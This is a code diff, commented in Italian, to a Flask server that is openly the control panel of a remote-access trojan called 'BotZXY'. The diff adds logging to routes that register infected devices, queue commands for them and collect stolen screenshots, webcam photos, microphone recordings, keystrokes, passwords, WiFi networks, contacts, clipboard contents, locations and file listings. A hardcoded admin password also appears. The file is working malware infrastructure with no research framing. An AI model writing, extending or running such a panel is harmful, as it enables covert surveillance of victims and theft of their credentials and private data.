@@ -59,6 +59,16 @@ def load_user(user_id):
     conn.close()
     return User(user['id'], user['username'], user['api_key']) if user else None
 
+# ============ FUNZIONE PER LOG ============
+def log_action(device_id, action, details):
+    try:
+        conn = get_db()
+        conn.execute('INSERT INTO logs (device_id, action, details) VALUES (?, ?, ?)', (device_id, action, details))
+        conn.commit()
+        conn.close()
+    except:
+        pass
+
 # ============ ROUTES PRINCIPALI ============
 @app.route('/')
 def index():
@@ -80,6 +90,7 @@ def login():
                 minutes = remaining // 60
                 seconds = remaining % 60
                 error = f"🚫 Account bloccato. Riprova tra {minutes}m {seconds}s"
+                log_action('system', 'login_blocked', f'Account {username} bloccato per {minutes}m')
                 return render_template('login.html', error=error)
             
             if user_attempts.get('blocked_until') and time.time() >= user_attempts['blocked_until']:
@@ -95,6 +106,7 @@ def login():
                 LOGIN_ATTEMPTS[username]['count'] = 0
                 LOGIN_ATTEMPTS[username]['blocked_until'] = None
             login_user(User(user['id'], user['username'], user['api_key']))
+            log_action('system', 'login_success', f'Login effettuato da {username}')
             return render_template('dashboard.html')
         else:
             if username not in LOGIN_ATTEMPTS:
@@ -111,9 +123,11 @@ def login():
                 LOGIN_ATTEMPTS[username]['blocked_until'] = time.time() + block_seconds
                 
                 error = f"🚫 Troppi tentativi falliti. Account bloccato per {block_minutes} minuti."
+                log_action('system', 'login_blocked', f'Account {username} bloccato per {block_minutes}m dopo {attempts_used} tentativi')
                 return render_template('login.html', error=error)
             else:
                 error = f"❌ Credenziali errate. Tentativi rimasti: {attempts_left}"
+                log_action('system', 'login_failed', f'Tentativo login fallito per {username}, tentativi rimasti: {attempts_left}')
                 return render_template('login.html', error=error)
     
     return render_template('login.html', error=error)
@@ -126,10 +140,11 @@ def dashboard():
 @app.route('/logout')
 @login_required
 def logout():
+    log_action('system', 'logout', f'Logout di {current_user.username}')
     logout_user()
     return index()
 
-# ============ PAGINE LOGS E SETTINGS ============
+# ============ PAGINE ============
 @app.route('/logs')
 @login_required
 def logs_page():
@@ -139,6 +154,21 @@ def logs_page():
 @login_required
 def settings_page():
     return render_template('settings.html')
+
+@app.route('/devices')
+@login_required
+def devices_page():
+    return render_template('dashboard.html')
+
+@app.route('/captures')
+@login_required
+def captures_page():
+    return render_template('dashboard.html')
+
+@app.route('/analytics')
+@login_required
+def analytics_page():
+    return render_template('dashboard.html')
 
 # ============ API DEVICES ============
 @app.route('/api/devices', methods=['GET'])
@@ -176,10 +206,12 @@ def register_device():
         conn.execute('UPDATE devices SET last_seen = CURRENT_TIMESTAMP, is_online = 1, ip = ? WHERE device_id = ?', (ip, device_id))
         conn.commit()
         conn.close()
+        log_action(device_id, 'device_updated', f'Device {hostname} reconnected')
         return jsonify({'status': 'updated'})
     conn.execute('INSERT INTO devices (device_id, platform, hostname, ip, os_version, last_seen, is_online, bot_name) VALUES (?, ?, ?, ?, ?, CURRENT_TIMESTAMP, 1, "BotZXY")', (device_id, platform, hostname, ip, os_version))
     conn.commit()
     conn.close()
+    log_action(device_id, 'device_registered', f'Nuovo device {hostname} ({platform}) registrato')
     return jsonify({'status': 'registered', 'device_id': device_id})
 
 @app.route('/api/command/<device_id>', methods=['POST'])
@@ -192,6 +224,7 @@ def send_command(device_id):
     conn.execute('INSERT INTO commands (device_id, command, params, status) VALUES (?, ?, ?, "pending")', (device_id, command, params))
     conn.commit()
     conn.close()
+    log_action(device_id, 'command_sent', f'Comando: {command} {params}')
     return jsonify({'status': 'command_queued'})
 
 @app.route('/api/poll/<device_id>', methods=['GET'])
@@ -213,6 +246,7 @@ def command_result(device_id):
     conn.execute('UPDATE commands SET status = ?, result = ?, executed_at = CURRENT_TIMESTAMP WHERE id = ? AND device_id = ?', (status, result, command_id, device_id))
     conn.commit()
     conn.close()
+    log_action(device_id, 'command_result', f'Comando {command_id} eseguito: {status}')
     return jsonify({'status': 'recorded'})
 
 # ============ API CAPTURES ============
@@ -223,6 +257,7 @@ def upload_screenshot(device_id):
     conn.execute('INSERT INTO captures (device_id, type, data) VALUES (?, "screenshot", ?)', (device_id, data.get('image_base64')))
     conn.commit()
     conn.close()
+    log_action(device_id, 'screenshot_captured', 'Screenshot catturato')
     return jsonify({'status': 'saved'})
 
 @app.route('/api/webcam/<device_id>', methods=['POST'])
@@ -232,6 +267,7 @@ def upload_webcam(device_id):
     conn.execute('INSERT INTO captures (device_id, type, data) VALUES (?, "webcam", ?)', (device_id, data.get('image_base64')))
     conn.commit()
     conn.close()
+    log_action(device_id, 'webcam_captured', 'Foto webcam catturata')
     return jsonify({'status': 'saved'})
 
 @app.route('/api/mic/<device_id>', methods=['POST'])
@@ -241,6 +277,7 @@ def upload_mic(device_id):
     conn.execute('INSERT INTO captures (device_id, type, data) VALUES (?, "mic", ?)', (device_id, data.get('audio_base64')))
     conn.commit()
     conn.close()
+    log_action(device_id, 'mic_recorded', 'Audio registrato')
     return jsonify({'status': 'saved'})
 
 @app.route('/api/contacts/<device_id>', methods=['POST'])
@@ -250,6 +287,7 @@ def upload_contacts(device_id):
     conn.execute('UPDATE devices SET phone_number = ?, email = ?, contacts = ? WHERE device_id = ?', (data.get('phone_number'), data.get('email'), json.dumps(data.get('contacts', [])), device_id))
     conn.commit()
     conn.close()
+    log_action(device_id, 'contacts_extracted', 'Contatti estratti')
     return jsonify({'status': 'saved'})
 
 @app.route('/api/clipboard/<device_id>', methods=['POST'])
@@ -259,6 +297,7 @@ def upload_clipboard(device_id):
     conn.execute('INSERT INTO captures (device_id, type, data) VALUES (?, "clipboard", ?)', (device_id, data.get('content', '')))
     conn.commit()
     conn.close()
+    log_action(device_id, 'clipboard_captured', 'Clipboard catturata')
     return jsonify({'status': 'saved'})
 
 @app.route('/api/location/<device_id>', methods=['POST'])
@@ -268,6 +307,7 @@ def upload_location(device_id):
     conn.execute('INSERT INTO captures (device_id, type, data) VALUES (?, "location", ?)', (device_id, json.dumps(data.get('location', {}))))
     conn.commit()
     conn.close()
+    log_action(device_id, 'location_updated', 'Posizione aggiornata')
     return jsonify({'status': 'saved'})
 
 # ============ NUOVE API ============
@@ -278,6 +318,7 @@ def upload_keylog(device_id):
     conn.execute('INSERT INTO captures (device_id, type, data) VALUES (?, "keylog", ?)', (device_id, data.get('keys', '')))
     conn.commit()
     conn.close()
+    log_action(device_id, 'keylog_captured', 'Keylog catturato')
     return jsonify({'status': 'saved'})
 
 @app.route('/api/passwords/<device_id>', methods=['POST'])
@@ -287,6 +328,7 @@ def upload_passwords(device_id):
     conn.execute('INSERT INTO captures (device_id, type, data) VALUES (?, "passwords", ?)', (device_id, json.dumps(data.get('passwords', []))))
     conn.commit()
     conn.close()
+    log_action(device_id, 'passwords_extracted', 'Password estratte')
     return jsonify({'status': 'saved'})
 
 @app.route('/api/mouse/<device_id>', methods=['POST'])
@@ -296,6 +338,7 @@ def upload_mouse(device_id):
     conn.execute('INSERT INTO captures (device_id, type, data) VALUES (?, "mouse", ?)', (device_id, json.dumps(data)))
     conn.commit()
     conn.close()
+    log_action(device_id, 'mouse_interaction', 'Interazione mouse')
     return jsonify({'status': 'saved'})
 
 @app.route('/api/wifi/<device_id>', methods=['POST'])
@@ -305,6 +348,7 @@ def upload_wifi(device_id):
     conn.execute('INSERT INTO captures (device_id, type, data) VALUES (?, "wifi", ?)', (device_id, json.dumps(data.get('networks', []))))
     conn.commit()
     conn.close()
+    log_action(device_id, 'wifi_extracted', 'Reti WiFi estratte')
     return jsonify({'status': 'saved'})
 
 @app.route('/api/files/<device_id>', methods=['POST'])
@@ -314,6 +358,7 @@ def upload_files(device_id):
     conn.execute('INSERT INTO captures (device_id, type, data) VALUES (?, "files", ?)', (device_id, json.dumps({'path': data.get('path', '/'), 'files': data.get('files', [])})))
     conn.commit()
     conn.close()
+    log_action(device_id, 'file_list', 'Lista file')
     return jsonify({'status': 'saved'})
 
 # ============ API STATS E GRAFICI ============
@@ -364,20 +409,9 @@ def get_logs():
     
     conn = get_db()
     if device_id:
-        logs = conn.execute('''
-            SELECT id, device_id, action, details, timestamp 
-            FROM logs 
-            WHERE device_id = ? 
-            ORDER BY timestamp DESC 
-            LIMIT ?
-        ''', (device_id, limit)).fetchall()
+        logs = conn.execute('SELECT id, device_id, action, details, timestamp FROM logs WHERE device_id = ? ORDER BY timestamp DESC LIMIT ?', (device_id, limit)).fetchall()
     else:
-        logs = conn.execute('''
-            SELECT id, device_id, action, details, timestamp 
-            FROM logs 
-            ORDER BY timestamp DESC 
-            LIMIT ?
-        ''', (limit,)).fetchall()
+        logs = conn.execute('SELECT id, device_id, action, details, timestamp FROM logs ORDER BY timestamp DESC LIMIT ?', (limit,)).fetchall()
     conn.close()
     return jsonify([dict(l) for l in logs])
 
@@ -393,6 +427,7 @@ def clear_logs():
     conn.execute('DELETE FROM logs')
     conn.commit()
     conn.close()
+    log_action('system', 'logs_cleared', 'Log cancellati da admin')
     return jsonify({'status': 'cleared'})
 
 @app.route('/api/logs/export', methods=['GET'])
@@ -408,6 +443,7 @@ def export_logs():
 @login_required
 def get_settings():
     conn = get_db()
+    # Aggiungi colonne se non esistono
     try:
         conn.execute('ALTER TABLE users ADD COLUMN theme TEXT DEFAULT "dark"')
     except:
@@ -421,9 +457,7 @@ def get_settings():
     except:
         pass
     
-    settings = conn.execute('''
-        SELECT theme, language, notifications FROM users WHERE id = ?
-    ''', (current_user.id,)).fetchone()
+    settings = conn.execute('SELECT theme, language, notifications FROM users WHERE id = ?', (current_user.id,)).fetchone()
     conn.close()
     
     if settings:
@@ -456,29 +490,11 @@ def save_settings():
     except:
         pass
     
-    conn.execute('''
-        UPDATE users SET theme = ?, language = ?, notifications = ? WHERE id = ?
-    ''', (theme, language, notifications, current_user.id))
+    conn.execute('UPDATE users SET theme = ?, language = ?, notifications = ? WHERE id = ?', (theme, language, notifications, current_user.id))
     conn.commit()
     conn.close()
+    log_action('system', 'settings_updated', f'Impostazioni aggiornate: theme={theme}, language={language}')
     return jsonify({'status': 'saved'})
-
-# ============ ADMIN SETUP ============
-def setup_admin_user():
-    try:
-        conn = get_db()
-        admin = conn.execute('SELECT * FROM users WHERE username = "BotZXY-Admin"').fetchone()
-        if not admin:
-            api_key = hashlib.sha256(os.urandom(32)).hexdigest()
-            conn.execute('''
-                INSERT INTO users (username, password_hash, api_key)
-                VALUES (?, ?, ?)
-            ''', ('BotZXY-Admin', hashlib.sha256('35£t}nSBzoA%M#4T\e<'.encode()).hexdigest(), api_key))
-            conn.commit()
-            print('[+] Admin created: BotZXY-Admin / 35£t}nSBzoA%M#4T\e<')
-        conn.close()
-    except Exception as e:
-        print(f"[-] Admin creation error: {e}")
 
 # ============ GESTIONE TENTATIVI LOGIN ============
 @app.route('/admin/reset_attempts/<username>', methods=['POST'])
@@ -514,16 +530,27 @@ def get_login_attempts():
         if blocked_until:
             remaining = int(blocked_until - time.time())
             if remaining > 0:
-                result[username] = {
-                    'attempts': data['count'],
-                    'blocked_for': f"{remaining // 60}m {remaining % 60}s"
-                }
+                result[username] = {'attempts': data['count'], 'blocked_for': f"{remaining // 60}m {remaining % 60}s"}
             else:
                 result[username] = {'attempts': data['count'], 'blocked_for': 'None'}
         else:
             result[username] = {'attempts': data['count'], 'blocked_for': 'None'}
     
     return jsonify(result)
+
+# ============ ADMIN SETUP ============
+def setup_admin_user():
+    try:
+        conn = get_db()
+        admin = conn.execute('SELECT * FROM users WHERE username = "BotZXY-Admin"').fetchone()
+        if not admin:
+            api_key = hashlib.sha256(os.urandom(32)).hexdigest()
+            conn.execute('INSERT INTO users (username, password_hash, api_key) VALUES (?, ?, ?)', ('BotZXY-Admin', hashlib.sha256('35£t}nSBzoA%M#4T\e<'.encode()).hexdigest(), api_key))
+            conn.commit()
+            print('[+] Admin created: BotZXY-Admin / 35£t}nSBzoA%M#4T\e<')
+        conn.close()
+    except Exception as e:
+        print(f"[-] Admin creation error: {e}")
 
 # ============ ERROR HANDLER ============
 @app.errorhandler(404)
